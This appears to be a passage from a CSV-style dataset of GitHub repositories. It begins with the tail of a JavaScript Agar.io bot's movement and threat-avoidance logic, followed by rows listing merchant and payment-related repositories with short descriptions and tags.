removeList.length; i++) {             newListToUse.splice(removeList[i], 1);         }          if (startBool) {             newListToUse.splice(this.getAngleIndex(newListToUse, range[0][0]), 0, range[0]);         }         if (endBool) {             newListToUse.splice(this.getAngleIndex(newListToUse, range[1][0]), 0, range[1]);         }          return newListToUse;     };      this.getAngleRange = function(blob1, blob2, index, radius) {         var angleStuff = this.getEdgeLinesFromPoint(blob1, blob2, radius);          var leftAngle = angleStuff[0];         var rightAngle = this.rangeToAngle(angleStuff);         var difference = angleStuff[1];          drawPoint(angleStuff[2][0], angleStuff[2][1], 3, """");         drawPoint(angleStuff[3][0], angleStuff[3][1], 3, """");          //console.log(""Adding badAngles: "" + leftAngle + "", "" + rightAngle + "" diff: "" + difference);          var lineLeft = this.followAngle(leftAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);         var lineRight = this.followAngle(rightAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);          if (blob2.isVirus()) {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 6);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 6);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 6);         } else if(getCells().hasOwnProperty(blob2.id)) {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 0);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 0);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 0);         } else {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 3);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 3);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 3);         }          return [leftAngle, difference];     };      //Given a list of conditions, shift the angle to the closest available spot respecting the range given.     this.shiftAngle = function(listToUse, angle, range) {         //TODO: shiftAngle needs to respect the range! DONE?         for (var i = 0; i < listToUse.length; i++) {             if (this.angleIsWithin(angle, listToUse[i])) {                 //console.log(""Shifting needed!"");                  var angle1 = listToUse[i][0];                 var angle2 = this.rangeToAngle(listToUse[i]);                  var dist1 = this.mod(angle - angle1, 360);                 var dist2 = this.mod(angle2 - angle, 360);                  if (dist1 < dist2) {                     if (this.angleIsWithin(angle1, range)) {                         return angle1;                     } else {                         return angle2;                     }                 } else {                     if (this.angleIsWithin(angle2, range)) {                         return angle2;                     } else {                         return angle1;                     }                 }             }         }         //console.log(""No Shifting Was needed!"");         return angle;     };      /**      * This is the main bot logic. This is called quite often.      * @return A 2 dimensional array with coordinates for every cells.  [[x, y], [x, y]]      */     this.mainLoop = function() {         var player = getPlayer();         var interNodes = getMemoryCells();          if ( /*!toggle*/ 1) {             //The following code converts the mouse position into an             //absolute game coordinate.             var useMouseX = screenToGameX(getMouseX());             var useMouseY = screenToGameY(getMouseY());             tempPoint = [useMouseX, useMouseY, 1];              //The current destination that the cells were going towards.             var tempMoveX = getPointX();             var tempMoveY = getPointY();              drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() - (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() + (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);              //This variable will be returned at the end.             //It will contain the destination choices for all the cells.             //BTW!!! ERROR ERROR ABORT MISSION!!!!!!! READ BELOW -----------             //             //SINCE IT\'S STUPID NOW TO ASK EACH CELL WHERE THEY WANT TO GO,             //THE BOT SHOULD SIMPLY PICK ONE AND THAT\'S IT, I MEAN WTF....             var destinationChoices = []; //destination, size, danger              //Just to make sure the player is alive.             if (player.length > 0) {                  //Loop through all the player\'s cells.                 for (var k = 0; k < player.length; k++) {                     if (true) {                         drawPoint(player[k].x, player[k].y + player[k].size, 0, """" + (getLastUpdate() - player[k].birth) + "" / "" + (30000 + (player[k].birthMass * 57) - (getLastUpdate() - player[k].birth)) + "" / "" + player[k].birthMass);                     }                 }                   //Loops only for one cell for now.                 for (var k = 0; /*k < player.length*/ k < 1; k++) {                      //console.log(""Working on blob: "" + k);                      drawCircle(player[k].x, player[k].y, player[k].size + this.splitDistance, 5);                     //drawPoint(player[0].x, player[0].y - player[0].size, 3, """" + Math.floor(player[0].x) + "", "" + Math.floor(player[0].y));                      //var allDots = processEverything(interNodes);                      //loop through everything that is on the screen and                     //separate everything in it\'s own category.                     var allIsAll = this.getAll(player[k]);                      //The food stored in element 0 of allIsAll                     var allPossibleFood = allIsAll[0];                     //The threats are stored in element 1 of allIsAll                     var allPossibleThreats = allIsAll[1];                     //The viruses are stored in element 2 of allIsAll                     var allPossibleViruses = allIsAll[2];                      //The bot works by removing angles in which it is too                     //dangerous to travel towards to.                     var badAngles = [];                     var obstacleList = [];                      var isSafeSpot = true;                     var isMouseSafe = true;                      var clusterAllFood = this.clusterFood(allPossibleFood, player[k].size);                      //console.log(""Looking for enemies!"");                      //Loop through all the cells that were identified as threats.                     for (var i = 0; i < allPossibleThreats.length; i++) {                          var enemyDistance = this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y, allPossibleThreats[i].size);                          allPossibleThreats[i].enemyDist = enemyDistance;                     }                      /*allPossibleThreats.sort(function(a, b){                         return a.enemyDist-b.enemyDist;                     })*/                      for (var i = 0; i < allPossibleThreats.length; i++) {                          var enemyDistance = this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                          var splitDangerDistance = allPossibleThreats[i].size + this.splitDistance + 150;                          var normalDangerDistance = allPossibleThreats[i].size + 150;                          var shiftDistance = player[k].size;                          //console.log(""Found distance."");                          var enemyCanSplit = this.canSplit(player[k], allPossibleThreats[i]);                         var secureDistance = (enemyCanSplit ? splitDangerDistance : normalDangerDistance);                                                  for (var j = clusterAllFood.length - 1; j >= 0 ; j--) {                             if (this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, clusterAllFood[j][0], clusterAllFood[j][1]) < secureDistance + shiftDistance)                                 clusterAllFood.splice(j, 1);                         }                          //console.log(""Removed some food."");                          if (enemyCanSplit) {                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance, 0);                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance + shiftDistance, 6);                         } else {                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance, 3);                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance + shiftDistance, 6);                         }                          if (allPossibleThreats[i].danger && getLastUpdate() - allPossibleThreats[i].dangerTimeOut > 1000) {                              allPossibleThreats[i].danger = false;                         }                          /*if ((enemyCanSplit && enemyDistance < splitDangerDistance) ||                             (!enemyCanSplit && enemyDistance < normalDangerDistance)) {                              allPossibleThreats[i].danger = true;                             allPossibleThreats[i].dangerTimeOut = f.getLastUpdate();                         }*/                          //console.log(""Figured out who was important."");                          if ((enemyCanSplit && enemyDistance < splitDangerDistance) || (enemyCanSplit && allPossibleThreats[i].danger)) {                              badAngles.push(this.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance).concat(allPossibleThreats[i].enemyDist));                          } else if ((!enemyCanSplit && enemyDistance < normalDangerDistance) || (!enemyCanSplit && allPossibleThreats[i].danger)) {                              badAngles.push(this.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance).concat(allPossibleThreats[i].enemyDist));                          } else if (enemyCanSplit && enemyDistance < splitDangerDistance + shiftDistance) {                             var tempOb = this.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance + shiftDistance);                             var angle1 = tempOb[0];                             var angle2 = this.rangeToAngle(tempOb);                              obstacleList.push([[angle1, true], [angle2, false]]);                         } else if (!enemyCanSplit && enemyDistance < normalDangerDistance + shiftDistance) {                             var tempOb = this.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance + shiftDistance);                             var angle1 = tempOb[0];                             var angle2 = this.rangeToAngle(tempOb);                              obstacleList.push([[angle1, true], [angle2, false]]);                         }                         //console.log(""Done with enemy: "" + i);                     }                      //console.log(""Done looking for enemies!"");                      var goodAngles = [];                     var stupidList = [];                      for (var i = 0; i < allPossibleViruses.length; i++) {                         if (player[k].size < allPossibleViruses[i].size) {                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size + 10, 3);                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size * 2, 6);                          } else {                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size + 50, 3);                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size * 2, 6);                         }                     }                      for (var i = 0; i < allPossibleViruses.length; i++) {                         var virusDistance = this.computeDistance(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].x, player[k].y);                         if (player[k].size < allPossibleViruses[i].size) {                             if (virusDistance < (allPossibleViruses[i].size * 2)) {                                 var tempOb = this.getAngleRange(player[k], allPossibleViruses[i], i, allPossibleViruses[i].size + 10);                                 var angle1 = tempOb[0];                                 var angle2 = this.rangeToAngle(tempOb);                                 obstacleList.push([[angle1, true], [angle2, false]]);                             }                         } else {                             if (virusDistance < (player[k].size * 2)) {                                 var tempOb = this.getAngleRange(player[k], allPossibleViruses[i], i, player[k].size + 50);                                 var angle1 = tempOb[0];                                 var angle2 = this.rangeToAngle(tempOb);                                 obstacleList.push([[angle1, true], [angle2, false]]);                             }                         }                     }                      if (badAngles.length > 0) {                         //NOTE: This is only bandaid wall code. It\'s not the best way to do it.                         stupidList = this.addWall(stupidList, player[k]);                     }                      for (var i = 0; i < badAngles.length; i++) {                         var angle1 = badAngles[i][0];                         var angle2 = this.rangeToAngle(badAngles[i]);                         stupidList.push([[angle1, true], [angle2, false], badAngles[i][2]]);                     }                      //stupidList.push([[45, true], [135, false]]);                     //stupidList.push([[10, true], [200, false]]);                      stupidList.sort(function(a, b){                         //console.log(""Distance: "" + a[2] + "", "" + b[2]);                         return a[2]-b[2];                     });                      //console.log(""Added random noob stuff."");                      var sortedInterList = [];                     var sortedObList = [];                      for (var i = 0; i < stupidList.length; i++) {                         //console.log(""Adding to sorted: "" + stupidList[i][0][0] + "", "" + stupidList[i][1][0]);                         var tempList = this.addAngle(sortedInterList, stupidList[i]);                          if (tempList.length === 0) {                             console.log(""MAYDAY IT\'S HAPPENING!"");                             break;                         } else {                             sortedInterList = tempList;                         }                     }                      for (var i = 0; i < obstacleList.length; i++) {                         sortedObList = this.addAngle(sortedObList, obstacleList[i]);                          if (sortedObList.length === 0) {                             break;                         }                     }                      var offsetI = 0;                     var obOffsetI = 1;                      if (sortedInterList.length > 0 && sortedInterList[0][1]) {                         offsetI = 1;                     }                     if (sortedObList.length > 0 && sortedObList[0][1]) {                         obOffsetI = 0;                     }                      var goodAngles = [];                     var obstacleAngles = [];                      for (var i = 0; i < sortedInterList.length; i += 2) {                         var angle1 = sortedInterList[this.mod(i + offsetI, sortedInterList.length)][0];                         var angle2 = sortedInterList[this.mod(i + 1 + offsetI, sortedInterList.length)][0];                         var diff = this.mod(angle2 - angle1, 360);                         goodAngles.push([angle1, diff]);                     }                      for (var i = 0; i < sortedObList.length; i += 2) {                         var angle1 = sortedObList[this.mod(i + obOffsetI, sortedObList.length)][0];                         var angle2 = sortedObList[this.mod(i + 1 + obOffsetI, sortedObList.length)][0];                         var diff = this.mod(angle2 - angle1, 360);                         obstacleAngles.push([angle1, diff]);                     }                      for (var i = 0; i < goodAngles.length; i++) {                         var line1 = this.followAngle(goodAngles[i][0], player[k].x, player[k].y, 100 + player[k].size);                         var line2 = this.followAngle(this.mod(goodAngles[i][0] + goodAngles[i][1], 360), player[k].x, player[k].y, 100 + player[k].size);                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 1);                         drawLine(player[k].x, player[k].y, line2[0], line2[1], 1);                          drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 1);                          //drawPoint(player[0].x, player[0].y, 2, """");                          drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                         drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                     }                      for (var i = 0; i < obstacleAngles.length; i++) {                         var line1 = this.followAngle(obstacleAngles[i][0], player[k].x, player[k].y, 50 + player[k].size);                         var line2 = this.followAngle(this.mod(obstacleAngles[i][0] + obstacleAngles[i][1], 360), player[k].x, player[k].y, 50 + player[k].size);                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 6);                         drawLine(player[k].x, player[k].y, line2[0], line2[1], 6);                          drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 6);                          //drawPoint(player[0].x, player[0].y, 2, """");                          drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                         drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                     }                      if (this.toggleFollow && goodAngles.length === 0) {                         //This is the follow the mouse mode                         var distance = this.computeDistance(player[k].x, player[k].y, tempPoint[0], tempPoint[1]);                          var shiftedAngle = this.shiftAngle(obstacleAngles, this.getAngle(tempPoint[0], tempPoint[1], player[k].x, player[k].y), [0, 360]);                          var destination = this.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                          destinationChoices = destination;                         drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                         //tempMoveX = destination[0];                         //tempMoveY = destination[1];                      } else if (goodAngles.length > 0) {                         var bIndex = goodAngles[0];                         var biggest = goodAngles[0][1];                         for (var i = 1; i < goodAngles.length; i++) {                             var size = goodAngles[i][1];                             if (size > biggest) {                                 biggest = size;                                 bIndex = goodAngles[i];                             }                         }                         var perfectAngle = this.mod(bIndex[0] + bIndex[1] / 2, 360);                          perfectAngle = this.shiftAngle(obstacleAngles, perfectAngle, bIndex);                          var line1 = this.followAngle(perfectAngle, player[k].x, player[k].y, verticalDistance());                          destinationChoices = line1;                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 7);                         //tempMoveX = line1[0];                         //tempMoveY = line1[1];                     } else if (badAngles.length > 0 && goodAngles.length === 0) {                         //When there are enemies around but no good angles                         //You\'re likely screwed. (This should never happen.)                          console.log(""Failed"");                         destinationChoices = [tempMoveX, tempMoveY];                         /*var angleWeights = [] //Put weights on the angles according to enemy distance                         for (var i = 0; i < allPossibleThreats.length; i++){                             var dist = this.computeDistance(player[k].x, player[k].y, allPossibleThreats[i].x, allPossibleThreats[i].y);                             var angle = this.getAngle(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                             angleWeights.push([angle,dist]);                         }                         var maxDist = 0;                         var finalAngle = 0;                         for (var i = 0; i < angleWeights.length; i++){                             if (angleWeights[i][1] > maxDist){                                 maxDist = angleWeights[i][1];                                 finalAngle = this.mod(angleWeights[i][0] + 180, 360);                             }                         }                         var line1 = this.followAngle(finalAngle,player[k].x,player[k].y,f.verticalDistance());                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 2);                         destinationChoices.push(line1);*/                     } else if (clusterAllFood.length > 0) {                         for (var i = 0; i < clusterAllFood.length; i++) {                             //console.log(""mefore: "" + clusterAllFood[i][2]);                             //This is the cost function. Higher is better.                                  var clusterAngle = this.getAngle(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                                  clusterAllFood[i][2] = clusterAllFood[i][2] * 6 - this.computeDistance(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                                 //console.log(""Current Value: "" + clusterAllFood[i][2]);                                  //(goodAngles[bIndex][1] / 2 - (Math.abs(perfectAngle - clusterAngle)));                                  clusterAllFood[i][3] = clusterAngle;                                  drawPoint(clusterAllFood[i][0], clusterAllFood[i][1], 1, """");                                 //console.log(""After: "" + clusterAllFood[i][2]);                         }                          var bestFoodI = 0;                         var bestFood = clusterAllFood[0][2];                         for (var i = 1; i < clusterAllFood.length; i++) {                             if (bestFood < clusterAllFood[i][2]) {                                 bestFood = clusterAllFood[i][2];                                 bestFoodI = i;                             }                         }                          //console.log(""Best Value: "" + clusterAllFood[bestFoodI][2]);                          var distance = this.computeDistance(player[k].x, player[k].y, clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1]);                          var shiftedAngle = this.shiftAngle(obstacleAngles, this.getAngle(clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1], player[k].x, player[k].y), [0, 360]);                          var destination = this.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                          destinationChoices = destination;                         //tempMoveX = destination[0];                         //tempMoveY = destination[1];                         drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                     } else {                         //If there are no enemies around and no food to eat.                         destinationChoices = [tempMoveX, tempMoveY];                     }                      drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """");                     //drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """" + Math.floor(this.computeDistance(tempPoint[0], tempPoint[1], I, J)));                     //drawLine(tempPoint[0], tempPoint[1], player[0].x, player[0].y, 6);                     //console.log(""Slope: "" + slope(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Angle: "" + getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Side: "" + this.mod(getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) - 90, 360));                     tempPoint[2] = 1;                      //console.log(""Done working on blob: "" + i);                 }                  //TODO: Find where to go based on destinationChoices.                 /*var dangerFound = false;                 for (var i = 0; i < destinationChoices.length; i++) {                     if (destinationChoices[i][2]) {                         dangerFound = true;                         break;                     }                 }                  destinationChoices.sort(function(a, b){return b[1] - a[1]});                  if (dangerFound) {                     for (var i = 0; i < destinationChoices.length; i++) {                         if (destinationChoices[i][2]) {                             tempMoveX = destinationChoices[i][0][0];                             tempMoveY = destinationChoices[i][0][1];                             break;                         }                     }                 } else {                     tempMoveX = destinationChoices.peek()[0][0];                     tempMoveY = destinationChoices.peek()[0][1];                     //console.log(""Done "" + tempMoveX + "", "" + tempMoveY);                 }*/             }             //console.log(""MOVING RIGHT NOW!"");              //console.log(""______Never lied ever in my life."");              return destinationChoices;         }     }; }; window.botList.push(new AposBot());  window.updateBotList(); //This function might not exist yet.",,2
0,https://github.com/PrestaShop/ps_legalcompliance.git,This module helps merchants in getting compliant with applicable e-commerce law.,"prestashop-module,hacktoberfest",1
0,https://github.com/boombotix/spree_google_merchant.git,Google Merchant gem for Spree eCommerce Platform,,1
0,https://github.com/italia/18app-esercenti-docs.git,Docs for merchants integration with 18app,,1
0,https://github.com/sirius17/MoG.git,Merchant of the galaxy,,1
0,https://github.com/NawabHost/bkash-merchant-for-whmcs.git,Collect payment with bKash Merchant Merchant (Legacy).,"bkash,payment-gateway,whmcs,whmcs-payment-gateway,whmcs-module",1
0,https://github.com/yangray1/Price-Scam-Detector.git,"{""An app that determines if you're being scammed by overpriced merchants in shopping malls.""}",,1
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-WHMCS.git,SpectroCoin Bitcoin merchant plugin for WHMCS,,1
0,https://github.com/Lambda-School-Labs/LABSPT15-merchant-marketplace-d-fe.git,frontend for labspt15 merchant-marketplace team D,,1
0,https://github.com/RazerMS/OpenCart2.0_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v2.0,,1
0,https://github.com/wangjh0629/Merchant-API-Examples.git,Contains examples of how to call our Merchant API,,1
0,https://github.com/whitmanc/spree_qbms.git,QuickBooks Merchant Services gateway for use in Spree 1.0,,1
0,https://github.com/wirecard/docs.git,Wirecard Merchant Documentation Gateway,,1
0,https://github.com/mypoolin/BharatQR.git,BharatQR documentation for merchants ,,1
0,https://github.com/mahoriES/esm_mit_merchant.git,Merchant App - Base for MIT event,,1
0,https://github.com/SpectroCoin/Bitcoin-Merchant-PHP.git,SpectroCoin Bitcoin Merchant API PHP client,,1
0,https://github.com/cafebitcoin/latte.git,bitcoin payment processor for merchants,,1
0,https://github.com/cammino/magento-googlemerchant.git,Google Merchant module for Magento,,1
0,https://github.com/Proofo/proofo-magento-2.git,"Proofo is Social Proof app for Magento 2 which helps merchants increase conversion rate 30%, trust, credibility, and sales with real-time social proof.",,1
0,https://github.com/ParveenBhadooOfficial/PayuMoneyPaymentsGatewayPHP.git,PayuMoney Payments Gateway for Custom Merchant Payments using PHP,,1
0,https://github.com/silici0/GoogleParserFeed.git,Parse google merchant feed to array  PHP,,1
0,https://github.com/paysafegroup/skrill_automatedpaymentinterface-mqi.git,Skrill Automated Payment Interface and Merchant Query Interface Documentation,,1
0,https://github.com/sunmit9/merchantsGuideToGalaxy.git,"{""ThoughtWorks coding problem: Merchant's Guide to the Galaxy""}","thoughtworks,galaxy,merchants-guide,assignment,java",1
0,https://github.com/openbiyong/merchant-server-demo-java.git,Merchant server demo,,1
0,https://github.com/SpectroCoin/SpectroCoin-Bitcoin-Merchant-API.git,Merchant API Documentation,,1
0,https://github.com/PowerSync/TNW_Stripe.git,"The Stripe integration from PowerSync is a fully PCI compliant solution, which allows merchants to accept payments in Magento through the use of their platform.","magento2-module,payment,payment-gateway,stripe,stripe-payments",1
0,https://github.com/polac/shuup_localbitcoins.git,Localbitcoins Merchant integration for Shuup e-commerce platform,,1
0,https://github.com/WHMCS/sample-tokenisation-gateway-module.git,Sample Tokenisation Merchant Payment Gateway Module for WHMCS,,1
0,https://github.com/Drzaln/GOKEL-Mobile.git,Mobile app that helping buyer to reach nearest merchant.,,1
0,https://github.com/RazerMS/OpenCart3.0_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v3.0,,1
0,https://github.com/junderw/deposit-contract-poc.git,A POC for a new ERC for exchange / merchant deposits,,1
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-c-be.git,merchant-marketplace project for Labspt17,labspt17,1
0,https://github.com/wirecard/docs-oas.git,OpenAPI specifications for merchant documentation,,1
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-c-fe.git,merchant-marketplace project for Labspt17,labspt17,1
0,https://github.com/KimRossey/MerchantTribe.git,MerchantTribe is a shopping cart and ecommerce platform with analytics and Content Management Capabilities. Our goals is to build a cart that makes merchants smarter by providing the tools they need to accurately determine what their business is doing and what they can change to increase sales.,,1
0,https://github.com/hiqdev/omnipay-paxum.git,Paxum plugin for PHP merchant library,hacktoberfest,1
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Magento.git,SpectroCoin Bitcoin merchant plugin for Magento,,1
0,https://github.com/artursbraucs/banklink.git,"Banklink integration in your website without active merchant. (Latvia Swedbank, Estonia Swedbank)",,1
0,https://github.com/bitpay/bitpay-chrome-extension.git,An extension to see if BitPay is available on merchant sites,,1
0,https://github.com/webdev36/best-of-year-awards_project.git,E-Commerce-style Contest Submission Platform(use mysql and integrated authorize.net and active_merchant),,1
0,https://github.com/RazerMS/rms-mobile-xdk-titanium.git,Razer Merchant Services mobile payment for Titanium - Appcelerator (CommonJS),,1
0,https://github.com/TechTalentSouthNOLA/merchant.git,Merchant app for Full-Time Winter 2016 cohort,,1
0,https://github.com/RazerMS/rms-mobile-xdk-xamarin-android.git,Razer Merchant Services mobile payment for Xamarin (Native Android),,1
0,https://github.com/Mthec/BuyerMerchant.git,Merchant for Wurm Unlimited that buys instead of sells.,,1
0,https://github.com/haraldpdl/oscom2_app_paypal.git,PayPal App for osCommerce Online Merchant v2.x,"paypal,oscommerce",1
0,https://github.com/freegenie/wp-e-commerce-bypass-merchant.git,Workaround to bypass merchant step when purchase total il zero.,,1
0,https://github.com/malfasih/casperjs-creditcard-checker.git,CasperJs based Credit Card Checker | merchant by gofundme.com,"casperjs,phantomjs,creditcard-validator",1
0,https://github.com/amirmans/merchants.git,merchants sites with the merchant codeigniter,,1
0,https://github.com/rakshitmaggon/dm_website.git,Official Dream Merchants Website ,"buisness,vit,dreammerchants,dm,website",1
0,https://github.com/love333qiang/find-android-merchants.git,Find Android Merchants,,1
0,https://github.com/rockforhope/The-Guild.git,Merchants and Information brokers.,,1
0,https://github.com/dbrdar1/public-relations-web-app.git,"A web app that communicates to clients/customers, as a part of a big information system for merchants such as restaurants and supermarkets.",,1
0,https://github.com/akalongman/php-geomerchant.git,PHP Library for Georgian merchants,,1
0,https://github.com/gaurishankar/Merchant.git,Merchant,,1
0,https://github.com/elxjitendra1/FonePay-WHMCS.git,FonePay Merchants Integration for WHMCS,,1
0,https://github.com/divyeshvala/SafeBuy.git,An Android App that provides the location of safe ATMs and Merchants with other functionalities like messaging service and online payments.,"android-app,android-studio,visa-direct,essentials,firebase,visa,java,python",1
0,https://github.com/jzschuurman/thedyeingmerchants.git,Website for The Dyeing Merchants,,1
0,https://github.com/vocalinkzapp/ZappMerchantLib-R2-iOS.git,The Pay by Bank app Merchant Library for iOS makes it easy for you to add Pay by Bank app as a new payment method.,,1
0,https://github.com/ESOUIMods/MasterMerchant.git,Master Merchant is an upgraded version of Shopkeeper that offers additional features for the Traders and Trading Guilds.,,1
0,https://github.com/XianyiGao/insight_project_repository.git,Etsymator: Competitive Pricing for Etsy Merchants,"etsymator,price-prediction,price-estimation",1
0,https://github.com/affili-ir/wordpress.git,"{""The WordPress plugin for Affili's merchants.""}","affili,affiliate-networks,affili-ir,affiliate-marketing,affiliate-tracking,affiliate-script",1
0,https://github.com/msk4862/PaytmPayment-web-plugin.git,Paytm payment web plugin for merchants.,"paytmsdk,php,webview,payment-integration",1
0,https://github.com/stebunting/swish-merchant.git,Swish for Merchants Node.js Integration Library,,1
0,https://github.com/Ghebrehiywet/eShopper.git,"eShopper - on online shopping/vending system for an online merchant to serve buyers and sellers (think, alibaba or amazon)",,1
0,https://github.com/APDevTeam/APAutoNPC.git,Allows purchase of NPC Merchants on AP,,1
0,https://github.com/tay-yijun/grabpay-map-vue.git,Display GrabPay Merchants on a map üó∫. ,,1
0,https://github.com/yubo1993/zhaoyin_match.git,China Merchants Bank coupon purchase forecast,,1
0,https://github.com/schnmudgal/paytm-merchant.git,PayTM Ruby library for merchants API,"paytm,paytm-merchant,rails,money-library,stripe-payments,razorpay,ruby-library,money,monetization",1
0,https://github.com/Tiepnm/Merchant-guide.git,Merchant-guide,,1
0,https://github.com/PorkoRosso/DevTeam.git,Merchant Website,,1
0,https://github.com/evorick/shop_app.git,Merchant app. ,,1
0,https://github.com/weezyjagbabe/merchant.git,merchant PHP,,1
0,https://github.com/rakawestu/veritrans-mobile-snap.git,Example implementation of Merchant Server required for new Veritrans Mobile SDK,,1
0,https://github.com/sktan/Blesta-Automatic-Billing-Extended-Library.git,A library to integrate your Blesta non-merchant gateway with the automatic billing extended plugin,,1
0,https://github.com/LorenzoZaccagnini/Coupoken.git,Coupoken allows merchants to receive investments directly from customers,,1
0,https://github.com/MidigoF/ClientAddressBooking.git,Simple address booking for merchants to manage their clients,,1
0,https://github.com/Yassin-MT/BlockPerks.git,"Distributing vouchers, for employees, which are valid at participating merchants. ","vouchers,distributing-vouchers,blockchain,blockchain-technology,ethereum,dapp,solidity,solidity-contracts,smart-contracts",1
0,https://github.com/andresochoa91/atucasa-front-end.git,"A Tu Casa, Shopping app for small merchants",,1
0,https://github.com/crowdwiz-biz/cwd-merchant-referral.git,Python example for merchants referral system on CrowdWiz platform,,1
0,https://github.com/baudouindetruchis/camelito.git,Web platform allowing merchants to destocking their unsold goods,,1
0,https://github.com/kongara/SimpleInventory.git,Simple Rails application to keep track of merchants and items,,1
0,https://github.com/v1olen/Merchants-List.git,Sample front-end only merchants list with mocked api,,1
0,https://github.com/jsoftwares/qrcodePaymentSolution.git,App to provide payment gateway for merchants via qrcodes.,,1
0,https://github.com/atmattpatt/braintree_multi_merchant_example.git,Example of how to use Braintree with multiple merchants,,1
0,https://github.com/ThomasGuily/database.git,web application to buy product from local merchants ,,1
0,https://github.com/worthingtonse/Liquidity.git,"Code to help Merchants, Exchanges and Software Developers use CloudCoin",,1
0,https://github.com/Vidmasas/icApiDashboard.git,Live Oberlo merchants remarks dashboard via Intercom API ,,1
0,https://github.com/labelotero/holkshop.git,A virtual market where merchants and customer can meet,,1
0,https://github.com/woubuc/wurm-merchant-listing.git,Stay up to date with your favourite Wurm merchants,wurmunlimited,1
0,https://github.com/armsir33/CreditChecker.git,Check credit of individuals or merchants in terms of zhima,,1
0,https://github.com/amardeepk/partiko-onboard.git,merchant sign up,,1
0,https://github.com/razin92/payme.git,merchant service for 1C,,1
0,https://github.com/AnegaGit/Anega_NPCMerchants.git,Create NPC merchant settings,,1
0,https://github.com/maksimkurb/node-robokassa.js.git,Robokassa merchant for node,,1
0,https://github.com/putrautama007/KlikEatMerchant.git,KlikEat for merchant,,1
0,https://github.com/liqiangYang/Wish-Api.git,Wish Merchant Api,,1
0,https://github.com/anmurali/MerchantData.git,Merchant Data Enrichment,,1
0,https://github.com/dfgdfgdf/Moneybookers-Active-Merchant-Plugin.git,Moneybookers Active Merchant Plugin,,1
0,https://github.com/MitsuruFujiwara/Elo-Merchant-Category-Recommendation.git,Elo Merchant Category Recommendation,kaggle,1
0,https://github.com/ricaralan/merchant-desktop.git,Merchant for desktop,,1
0,https://github.com/shangren/mct.git,merchant  ÂïÜÊà∑platform,,1
0,https://github.com/technologythree/merchant_onboarding.git,Merchant Onboarding POC,,1
